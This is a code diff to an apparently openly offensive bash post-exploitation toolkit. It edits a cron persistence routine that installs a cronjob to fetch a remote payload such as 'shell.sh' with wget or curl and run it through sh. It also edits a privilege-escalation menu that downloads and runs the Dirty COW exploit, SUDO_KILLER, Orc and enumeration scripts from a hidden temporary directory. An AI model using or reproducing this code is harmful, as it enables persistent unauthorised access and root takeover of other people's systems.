@@ -127,10 +127,11 @@ lswrap(){
 
 cron(){
 	read -r -p "Enter server and payload file name for payload dropper (example http://server.com/shell.sh): " server
+	read -r -p "Enter name of payload to be executed: " payload
 	read -r -p "Would you like to use wget to download/execute or curl to download/execute in memory for cronjob?: " wc
 	case $wc in
 		[WGETwget]* )
-			cronjob="* * * * * wget -O- $server | sh";;
+			cronjob="* * * * * wget $server ; sh $payload";;
 		[CURLcurl]* )
 			cronjob="* * * * * curl -fsSL '$server' | sh";;
 	esac
@@ -165,8 +166,7 @@ cron(){
 
 
 escalate(){
-	randname=$HOME/.$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 13)
-	direct=${randname}
+	direct=/tmp/.$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 13)
 
 	conmethods(){
 		cat <<-EOF
@@ -228,36 +228,25 @@ escalate(){
 		return
 	}
 
-
 	downld(){
-		wget -P ${direct} $1 2>/dev/null
-		chmod +x ${direct}/*
+		clear
+		wget -q -P ${direct} $1
+		chmod -R +x ${direct}
 
 		if echo $1 | grep .py; then
 			python ${direct}/./*
 		elif echo $1 | grep .sh; then
 			${direct}/./*
 		elif echo $1 | grep .zip; then
-			unzip -q ${direct}/master.zip -d ${direct}/Orc
-
-			cat <<-EOF
-
-				Dropping into Orc shell!
-
-				Check https://github.com/zMarch/Orc for commands and usage.
-
-				EOF
-
-			ENV=${direct}/Orc/Orc-master/o.rc sh -i
-		else
-			gcc -pthread ${direct}/dirty.c -o ${direct}/dirty -lcrypt
-			${direct}/./dirty
+			unzip -q ${direct}/master.zip -d ${direct}/zip
+		else :
 		fi
 	}
 
-
 	dirty(){
 		downld https://raw.githubusercontent.com/d4rk007/dirtycow/master/dirty.c
+		gcc -pthread ${direct}/dirty.c -o ${direct}/dirty -lcrypt
+		${direct}/./dirty
 	}
 
 
@@ -275,12 +264,27 @@ escalate(){
 		downld https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
 	}
 
+	
+	sudokill(){
+		downld https://github.com/TH3xACE/SUDO_KILLER/archive/master.zip
+		${direct}/zip/*/./SUDO_KILLERv*
+	}
+
 
 	Orc(){
 		downld https://github.com/zMarch/Orc/archive/master.zip
+		cat <<-EOF
+
+			Dropping into Orc shell!
+
+			Check https://github.com/zMarch/Orc for commands and usage.
+
+			EOF
+
+		ENV=${direct}/zip/Orc-master/o.rc sh -i
 	}
 
-	options=( "Try conventional methods to escalate privileges" "Search for password in this system" "Download and run dirty cow exploit" "Download and run linuxprivchecker.py" "Download and run linux exploit suggester" "Download and run LinEnum" "Download and run Orc" "Return to main menu")
+	options=( "Try conventional methods to escalate privileges" "Search for password in this system" "Download and run dirty cow exploit" "Download and run linuxprivchecker.py" "Download and run linux exploit suggester" "Download and run LinEnum" "Download and run SUDO KILLER" "Download and run Orc" "Return to main menu")
 	dispatch_table=(
 		["Try conventional methods to escalate privileges"]=conmethods
 		["Search for password in this system"]=search
@@ -288,6 +292,7 @@ escalate(){
 		["Download and run linuxprivchecker.py"]=linprivesc
 		["Download and run linux exploit suggester"]=exploitsug
 		["Download and run LinEnum"]=lineum
+		["Download and run SUDO KILLER"]=sudokill
 		["Download and run Orc"]=Orc
 		["Return to main menu"]=return
 		)
@@ -296,7 +301,7 @@ escalate(){
 	
 	rm -rf ${direct}
 
-	if [ "$REPLY" -ge 1 -a "$REPLY" -le 6 ]; then
+	if [ "$REPLY" -ge 1 -a "$REPLY" -le 7 ]; then
 		enter
 	else
 		return
